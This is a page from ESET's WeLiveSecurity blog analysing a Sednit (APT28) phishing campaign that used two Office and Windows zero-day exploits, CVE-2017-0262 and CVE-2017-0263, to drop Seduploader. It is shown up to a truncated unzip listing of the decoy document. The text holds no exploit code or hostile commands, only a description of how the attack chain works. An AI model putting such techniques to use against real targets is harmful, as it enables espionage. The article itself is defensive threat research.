<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy | WeLiveSecurity</title>
<meta name="description" content="Sednit is back - this time with two more zero-day exploits embedded in a phishing email titled Trump&#039;s_Attack_on_Syria_English.docx."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy | WeLiveSecurity" />
<meta property="og:description" content="Sednit is back - this time with two more zero-day exploits embedded in a phishing email titled Trump&#039;s_Attack_on_Syria_English.docx." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2017-05-09T18:00:14+00:00" />
<meta property="article:modified_time" content="2017-10-17T06:51:05+00:00" />
<meta property="og:updated_time" content="2017-10-17T06:51:05+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/05/shutterstock_132524273.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/05/shutterstock_132524273.jpg" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="410" />
<meta property="og:image:alt" content="Sednit" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Sednit is back - this time with two more zero-day exploits embedded in a phishing email titled Trump&#039;s_Attack_on_Syria_English.docx." />
<meta name="twitter:title" content="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/05/shutterstock_132524273.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2017/05/11/sednit-adiciona-exploits-trump-siria/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/05/10/sednit-nuevos-exploits-ataque-trump-siria/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2017/05/09/sednit-ist-mit-zwei-zero-days-exploits-zurueck/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2017/05/11/sednit-adiciona-exploits-trump-siria/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/05/10/sednit-nuevos-exploits-ataque-trump-siria/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/05/09/sednit-ist-mit-zwei-zero-days-exploits-zurueck/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2017/05/11/sednit-adiciona-exploits-trump-siria/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/05/10/sednit-nuevos-exploits-ataque-trump-siria/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/05/09/sednit-ist-mit-zwei-zero-days-exploits-zurueck/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy</h1>
<div class="excerpt">Sednit is back - this time with two more zero-day exploits embedded in a phishing email titled Trump's_Attack_on_Syria_English.docx.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-05-09 20:00:14">9 May 2017 - 08:00PM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F&text=Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>Sednit is back &#8211; this time with two more zero-day exploits embedded in a phishing email titled Trump&#8217;s_Attack_on_Syria_English.docx.</p>
                            </div>

                            <h2><strong>Introduction</strong></h2>
<p>The Sednit group, also known as APT28, Fancy Bear and Sofacy, is a group of attackers operating since at least 2004 and whose main objective is to steal confidential information from specific targets. In October 2016, ESET published an extensive analysis of Sednit’s arsenal and tactics in a whitepaper titled <a href="https://www.welivesecurity.com/2016/10/20/new-eset-research-paper-puts-sednit-under-the-microscope/" target="_blank" rel="noopener noreferrer">En Route with Sednit</a>.</p>
<p>Last month, Sednit came in the light again, allegedly interfering with the <a href="https://motherboard.vice.com/en_us/article/evidence-linking-russian-hackers-fancy-bear-to-macron-phishing" target="_blank" rel="noopener noreferrer">French elections</a> and more precisely going after the frontrunner Emmanuel Macron. In the same time period, a phishing email containing an attachment named <span style="font-family: 'courier new', courier, monospace;">Trump&#8217;s_Attack_on_Syria_English.docx</span> caught our attention.</p>
<p>Analysis of the document revealed its end goal: dropping Sednit’s well-known reconnaissance tool, Seduploader. To achieve this, Sednit used two zero-day exploits: one for a Remote Code Execution vulnerability in Microsoft Word (CVE-2017-0262) and one for a Local Privilege Escalation in Windows (CVE-2017-0263). ESET reported both vulnerabilities to Microsoft, who today released patches during the regular Patch Tuesday schedule.</p>
<p>This blogpost describes the attack itself and the vulnerabilities used to infect its potential targets.</p>
<h2><strong>From a Word exploit to Seduploader Dropper</strong></h2>
<p>The graphic below shows that this specific attack is totally in line with Sednit’s usual attack methods: the use of a spearphishing email containing a malicious attachment to install a known first-stage payload.</p>
<p><img class="aligncenter wp-image-93300" src="/wp-content/uploads/2017/05/1-attack_methods-1024x988.png" alt="" width="623" height="601" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/1-attack_methods-1024x988.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/1-attack_methods-300x289.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/1-attack_methods-768x741.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/05/1-attack_methods-32x32.png 32w" sizes="(max-width: 623px) 100vw, 623px" /></p>
<p>This time, the phishing email was related to Trump’s attack on Syria.</p>
<p><img class="aligncenter wp-image-93301" src="/wp-content/uploads/2017/05/2-phishing-redacted.png" alt="" width="622" height="554" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/2-phishing-redacted.png 677w, https://www.welivesecurity.com/wp-content/uploads/2017/05/2-phishing-redacted-300x267.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/2-phishing-redacted-87x77.png 87w, https://www.welivesecurity.com/wp-content/uploads/2017/05/2-phishing-redacted-60x53.png 60w, https://www.welivesecurity.com/wp-content/uploads/2017/05/2-phishing-redacted-85x75.png 85w" sizes="(max-width: 622px) 100vw, 622px" /></p>
<p>The infected attachment is a decoy document containing a verbatim copy of an article titled “<em>Trump’s Attack on Syria: Wrong for so Many Reasons</em>” published on April 12, 2017 in <a href="http://www.thecaliforniacourier.com/trumps-attack-on-syria-wrong-for-so-many-reasons/" target="_blank" rel="noopener noreferrer">The California Courier</a>:</p>
<p><img class="aligncenter wp-image-93302" src="/wp-content/uploads/2017/05/3-infected-decoy-1024x596.png" alt="" width="795" height="463" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/3-infected-decoy-1024x596.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/3-infected-decoy-300x174.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/3-infected-decoy-768x447.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/05/3-infected-decoy-257x149.png 257w, https://www.welivesecurity.com/wp-content/uploads/2017/05/3-infected-decoy.png 1257w" sizes="(max-width: 795px) 100vw, 795px" /></p>
<p>This is where the attack becomes interesting. The decoy document contains two exploits allowing the installation of Seduploader. See the schema below for an overview.</p>
<p><img class="aligncenter wp-image-93303" src="/wp-content/uploads/2017/05/4-decoy-attack-overview-black-1024x674.png" alt="" width="813" height="535" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-1024x674.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-300x197.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-768x505.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-65x42.png 65w, https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-114x76.png 114w, https://www.welivesecurity.com/wp-content/uploads/2017/05/4-decoy-attack-overview-black-97x65.png 97w" sizes="(max-width: 813px) 100vw, 813px" /></p>
<p>These two exploits can be added to the list of zero-day vulnerabilities used by Sednit over the last 2 years, as shown in this timeline:</p>
<p><img class="aligncenter wp-image-93306" src="/wp-content/uploads/2017/05/5-0day-timeline-white-1024x808.png" alt="" width="814" height="642" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/5-0day-timeline-white-1024x808.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/5-0day-timeline-white-300x237.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/5-0day-timeline-white-768x606.png 768w" sizes="(max-width: 814px) 100vw, 814px" /></p>
<p>Once opened, the decoy document first triggers CVE-2017-0262, a vulnerability in the EPS filter in Microsoft Office. In this case, the malicious EPS file is called <span style="font-family: 'courier new', courier, monospace;">image1.eps</span> within the <span style="font-family: 'courier new', courier, monospace;">.docx</span> file:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882cadc935968249" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ file Trump\'s_Attack_on_Syria_English.docx
Trump's_Attack_on_Syria_English.docx: Zip archive data, at least v2.0 to extrac2
$ unzip Trump\'s_Attack_on_Syria_English.docx
Archive: Trump’s_Attack_on_Syria_English.docx
 inflating: [Content_Types].xml
 inflating: docProps/app.xml
 inflating: docProps/core.xml
 inflating: word/document.xml
 inflating: word/fontTable.xml
 inflating: word/settings.xml
 inflating: word/styles.xml
 inflating: word/webSettings.xml
 inflating: word/media/image1.eps
 inflating: word/theme/theme1.xml
 inflating: word/_rels/document.xml.rels
 inflating: _rels/.rels</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882cadc935968249-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-2">2</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-4">4</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-6">6</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-8">8</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-10">10</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-12">12</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-14">14</div><div class="crayon-num" data-line="crayon-60581b882cadc935968249-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882cadc935968249-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882cadc935968249-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">file </span><span class="crayon-v">Trump</span><span class="crayon-sy">\</span>'<span class="crayon-v">s_Attack_on_Syria_English</span><span class="crayon-sy">.</span><span class="crayon-e">docx</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-2"><span class="crayon-i">Trump</span>'<span class="crayon-v">s_Attack_on_Syria_English</span><span class="crayon-sy">.</span><span class="crayon-v">docx</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Zip </span><span class="crayon-e">archive </span><span class="crayon-v">data</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">at </span><span class="crayon-e">least </span><span class="crayon-v">v2</span><span class="crayon-sy">.</span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-i">extrac2</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-3"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-e">unzip </span><span class="crayon-v">Trump</span><span class="crayon-sy">\</span>'<span class="crayon-v">s_Attack_on_Syria_English</span><span class="crayon-sy">.</span><span class="crayon-e">docx</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-4"><span class="crayon-v">Archive</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Trump</span>’<span class="crayon-v">s_Attack_on_Syria_English</span><span class="crayon-sy">.</span><span class="crayon-e">docx</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-5"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">Content_Types</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-6"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">docProps</span><span class="crayon-o">/</span><span class="crayon-v">app</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-7"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">docProps</span><span class="crayon-o">/</span><span class="crayon-v">core</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-8"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-9"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">fontTable</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-10"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">settings</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-11"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">styles</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882cadc935968249-12"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">webSettings</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60581b882cadc935968249-13"><span class="crayon-e"> </span><span class="crayon-v">inflating</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">word</span><span class="crayon-o">/</span><span class="crayon-v">media</span><span class="crayon-o">/</span><span class="crayon-v">image1</span><span class="crayon-sy">.</span><span class="crayon-e">eps</span></div><div 